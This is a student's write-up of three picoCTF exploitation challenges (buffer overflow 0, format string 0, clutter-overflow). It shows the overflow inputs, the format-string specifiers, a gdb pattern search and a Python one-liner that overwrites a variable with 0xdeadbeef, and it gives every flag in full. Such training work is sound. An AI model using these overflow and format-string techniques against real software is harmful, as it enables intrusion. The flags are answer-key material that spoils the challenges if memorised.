# 1. buffer overflow 0

## Description
> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 53744

## Solution
On reading the source code and getting hints from the name of the challenge, I found that there was a user defined sigsegv_handler(int sig) function that would print the flag if a segmentation fault occured. 

```C
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
The vuln function gave me the clue that the way to cause this error would be by inputting value above the limit 16. On doing so, I was able to obtain the flag.

```bash
pri279-picoctf@webshell:~$ nc saturn.picoctf.net 53744
Input: qqqqqqqqqqqqqqqqqqqqqqqq
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Concepts Learnt:
I got an idea about signal handlers and how to cause buffer overflow to obtain desired output.

***

# 2. format string 0

## Description
> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 62847

## Solution
On launching the instance, I was able to access a menu driven program that asked me to choose a burger for a customer. It was mentioned that the customer, Patrick, wanted a giant bite. This meant that the option having format specifier %114d which meant an integer of size 114 would be resulted. This was the correct pick. For the second customer, SpongeBob wanted to "break the shop". Hence I picked the Cla%sic_Che%s%steak and it turned out to be the right option. 

```bash
pri279-picoctf@webshell:~$ nc mimas.picoctf.net 57603
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```
## Concepts Learnt:
I learnt about different types of format specifiers. 

***

# 3. clutter-overflow

## Description
> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution
First I ran the command `nc mars.picoctf.net 31980` on my terminal and tested out an input. Then I downloaded the chall.c file and analysed the code. On doing so, I found the usage of gets() function which means we can cause buffer overflow to result in segmentation fault.
I opened the chall.c file using gdb in the terminal
<img width="1421" height="617" alt="image" src="https://github.com/user-attachments/assets/3119b9db-55dc-47d5-9e5d-3095f64fc392" />
I saw that the code variable having value 0x0 was stored in the rbp register. Then I ran the code using run command and inputted a string 300 bytes long which, as expected, caused segmentation fault.
Now, using a command to find at which location the register is currently in:
```bash
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaa
code == 0x6261616161616169
code != 0xdeadbeef :(

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007c0 in main ()
gefâž¤  pattern search 0x6261616161616169
[+] Searching for '6961616161616162'/'6261616161616169' with period=8
[+] Found at offset 264 (little-endian search) likely
```
So using Python, I put the payload `(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./chall` and get flag.txt not found, which means I'm almost at the flag.
On piping the payload to `nc mars.picoctf.net 31890`
```bash
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
cat: flag.txt: No such file or directory
priya@DESKTOP-1TEEMJT:/mnt/c/Users/User/Desktop/picoCTF$ (python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Flag
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## References
<https://hugsy.github.io/gef/commands/pattern/>
<https://stackoverflow.com/questions/40299126/>
<https://hugsy.github.io/gef/install/>
***


